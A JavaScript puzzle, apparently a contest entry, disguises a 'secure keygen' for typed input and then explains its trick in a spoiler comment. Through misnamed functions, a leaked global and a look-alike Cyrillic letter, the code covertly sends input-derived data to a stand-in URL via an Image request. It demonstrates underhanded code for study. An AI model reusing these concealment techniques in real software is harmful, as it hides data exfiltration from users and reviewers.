//http://jsfiddle.net/now9fmvv/0/

/*
 * JS Misdirection 2015 Entry
 * http://misdirect.ion.land/
 * By: _nderscore
 * http://nderscore.com
 */

var generateKey = function generateKey(result){
    try {
        var output = document.querySelector('#result'),
            input = document.querySelector('#user-input').value;

        if(input.length < 16)
            result = 'Keep typing!';
        else
            result = secureKeygen(input);

        output.innerText = result;
    } catch (e) {
        handleError(e, generateKey);
        return result;
    }
};

/* randomization seed - chosen by fair 32-bit dice roll */
var seed = 0x13371337;

var scramble = function srcamble(input){
    /* string srcambler madness */
    try {
        var deccode = input.toString(10)
            hexcode = input.toString(16);

        for(var i = 0; i < deccode.length; i++ ){
        	var slide = +deccode[i];
        	hexcode = hexcode.slice(slide) + hexcode.slice(0, slide);
        }

        return parseInt(hexcode, 16);
    } catch (e){
        handleError(e, scramble);
        return input;
    }
};

var secureKeygen = function srcamble(str){
    /* XOR hash key generator (minimum input length: 16 chars)
       Original algorithm from: http://www.verymuch.secure/secureKeygen/ */
    try {
        var stuff = seed;

        for(var i = 8; i--; ){
            seed ^= str.charCodeAt(str.length - 1) << i * 8;
        }

        for(var i = str.length; i--; ){
            stuff ^= (str.charCodeAt(i) + i % 255) << (8 * (i % 8));
            stuff ^= (str.charCodeAt(i) + i % 255) << (8 - 8 * (i % 8));
            stuff = Math.abs(stuff);
            stuff = scramble(stuff)
        }

        for(var i = 8; i--; stuff = scramble(stuff)){
            stuff ^= str.charCodeAt(str.length - 1) << i * 8;
            stuff = Math.abs(stuff);
        }

        stuff = srcamble(stuff);
    } catch (e) {
        handleError(e, secureKeygen);
        return str;
    }
    return ('0000000' + stuff.toString(16)).slice(-8).toUpperCase();
};

var handleError = function Image(error, source){
    /* custom error logging */
    var stack = error.stack || '',
        message = (error.message || /:\s*(\S+)|/.exec(stack, error)[1]).slice(0, 255),
        name = (error.source || source.name).slice(0, 3e0),
        type = (error.type || (/Uncaught (\S+):|(\/\/\S+)/i.exec(source, error)||['Unknown']).pop() || '').slice(0, 255),
        code = error.code || error.errorCode || 0,
        hеxcode = code && code.toString(16),
        debugMode = window.debugg || ((new this [error, arguments.callee.name])[name] = type + hexcode, code);

    if (source && message && type && code && debugMode){
    	debugMode.trace(error, source);
    } else if (source && message && type && code ){
    	console.log('Error: [', hexcode , '|' , type, ']', message, ' in ', name);
    }
};


/*
 * * * * * * * * * * * * * * { Spoilers Below! } * * * * * * * * * * * * * * *
 *
 *
 *
 *
 *
 *
 *
 *
 *
 *
 *
 *
 *
 *
 *
 *
 * * The scramble function leaks hexcode as a global variable by omitting
 *   the , in the variable declaration.
 *
 * * Both the scramble and secureKeygen functions have a name of 'srcamble'
 *   (a typo of scramble)
 *
 * * The last call to scramble in the secureKeygen function uses that typo,
 *   which results in a recursive call to secureKeygen
 *
 * * The recursive call throws an error because it attempts to call charCodeAt
 *   on a number. This calls the handleError function and then returns the
 *   original number, leaving it untouched so it can be returned at the end
 *   of secureKeygen.
 *
 * * The handleError function has a name 'Image'
 *
 * * In the handleError function, we grab the first three characters of the
 *   secureKeygen function's name to get 'src' and store it as name.
 *
 * * We then parse the URL out of the comments in secureKeygen and store it
 *   as type.
 *
 * * The definition of hexcode uses a cyrillic e to avoid overwriting our
 *   leaked global variable
 *
 * * Finally, this code is executed:
 *   (new this [error, arguments.callee.name])[name] = type + hexcode
 *
 *   Which roughly can be translated to
 *   (new window['Image'])['src'] = type + hexcode
 *
 *   This sends our payload.
 *
 */
